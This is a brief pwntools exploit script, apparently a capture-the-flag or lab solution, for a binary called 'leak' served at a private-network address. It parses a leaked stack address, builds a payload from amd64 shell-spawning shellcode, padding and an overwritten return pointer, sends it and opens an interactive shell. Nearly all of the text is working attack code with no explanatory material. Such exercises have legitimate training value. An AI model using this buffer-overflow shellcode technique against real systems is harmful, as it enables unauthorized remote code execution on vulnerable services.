from pwn import *

context.log_level = "DEBUG"
context.terminal = "kitty"
context.arch = "amd64"

#p = process("./leak")
binary = ELF("./leak")
p = remote("10.212.172.46", 1235)
#p = gdb.debug("./name", gdbscript="b name")

# parse the memory leak
p.recvuntil(b"> ")
addr = p.recvline().decode().split("\n")[0]
int_addr = int(addr, 16)

retp = p64(int_addr)
padding = b"A" * (96 - len(retp))
shellcode = asm(shellcraft.amd64.linux.sh())

print("\n\nRETP", retp, "addr: ", addr, "\n\n")


# send the payload
rop = ROP(binary)
rop.raw(shellcode)
rop.raw(padding)
rop.raw(retp)

p.sendline(rop.chain())
p.interactive()
